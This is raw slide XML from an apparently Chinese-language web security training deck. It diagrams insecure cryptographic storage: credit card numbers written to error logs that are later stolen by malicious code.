                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4771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71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7187">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4771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71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7187">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4771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71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7187">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4771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71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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、不安全的加密存储示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="448516" name="Picture 4" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="3836988"/>
            <a:ext cx="1093788" cy="1268412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6172200" y="2209800"/>
            <a:ext cx="1455738" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448518" name="Rectangle 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="008000"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveTopRight">
                <a:rot lat="420000" lon="0" rev="0"/>
              </a:camera>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Custom Code</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448519" name="Rectangle 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023"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Accounts</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448520" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139"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Finance</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448521" name="Rectangle 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="426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Administration</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448522" name="Rectangle 10"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375" y="2193"/>
              <a:ext cx="726" cy="79"/>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Transactions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448523" name="Rectangle 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498"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Communication</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448524" name="Rectangle 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609"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Knowledge Mgmt</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448525" name="Rectangle 13"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725"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E-Commerce</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448526" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4842" y="2194"/>
              <a:ext cx="726" cy="78"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="008000"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="1801800" prstMaterial="legacyPlastic">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:srgbClr val="008000"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>Bus. Functions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="448527" name="Picture 15" descr="businesswoman"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1447800" y="1600200"/>
            <a:ext cx="1050925" cy="1255713"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 29"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2743200" y="1773238"/>
            <a:ext cx="3048000" cy="576262"/>
            <a:chOff x="1728" y="1117"/>
            <a:chExt cx="1920" cy="363"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448528" name="Oval 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1728" y="1207"/>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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448529" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2064" y="1117"/>
              <a:ext cx="1584" cy="363"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>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用户在</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>Web</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>表单中填写信用卡号提交 </a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5562600" y="4221163"/>
            <a:ext cx="3290888" cy="1030287"/>
            <a:chOff x="3504" y="2659"/>
            <a:chExt cx="2073" cy="649"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448530" name="Oval 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5280" y="2736"/>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2</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448531" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3504" y="2659"/>
              <a:ext cx="1776" cy="649"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>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由于商家的网关不可达，交易失败，错误处理日志 将问题详细记录下来 </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 32"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981200" y="3962400"/>
            <a:ext cx="2806700" cy="1122363"/>
            <a:chOff x="1248" y="2496"/>
            <a:chExt cx="1768" cy="707"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448532" name="Oval 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1248" y="2544"/>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4</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448533" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1576" y="2496"/>
              <a:ext cx="1440" cy="707"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>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使用恶意代码从日志文件中偷取数万计的信用卡号 </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448534" name="Freeform 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-263347">
            <a:off x="2590800" y="2457450"/>
            <a:ext cx="3508375" cy="207963"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="131"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1046" y="3"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2210" y="114"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2210" h="131">
                <a:moveTo>
                  <a:pt x="0" y="131"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="174" y="110"/>
                  <a:pt x="678" y="6"/>
                  <a:pt x="1046" y="3"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1414" y="0"/>
                  <a:pt x="1968" y="91"/>
                  <a:pt x="2210" y="114"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="33CC33"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448535" name="AutoShape 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6629400" y="3838575"/>
            <a:ext cx="1558925" cy="390525"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartMultidocument">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33CC33"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Log files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448536" name="Line 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7391400" y="3581400"/>
            <a:ext cx="0" cy="276225"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 31"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3121025" y="5410200"/>
            <a:ext cx="3127375" cy="755650"/>
            <a:chOff x="1966" y="3408"/>
            <a:chExt cx="1970" cy="476"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448537" name="Oval 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3639" y="3408"/>
              <a:ext cx="297" cy="235"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="66FF66"/>
            </a:solidFill>
            <a:ln w="9525" algn="ctr">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr anchor="ctr">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>3</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448538" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1966" y="3408"/>
              <a:ext cx="1776" cy="476"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="20000"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="10000"/>
                </a:spcAft>
                <a:buClr>
                  <a:srgbClr val="FF0000"/>
                </a:buClr>
                <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>日志文件可被相关</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>IT</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>职员访问，用于程序调试 </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448539" name="Freeform 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="5181600"/>
            <a:ext cx="1531937" cy="876300"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="957" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="805" y="463"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="531"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="965" h="552">
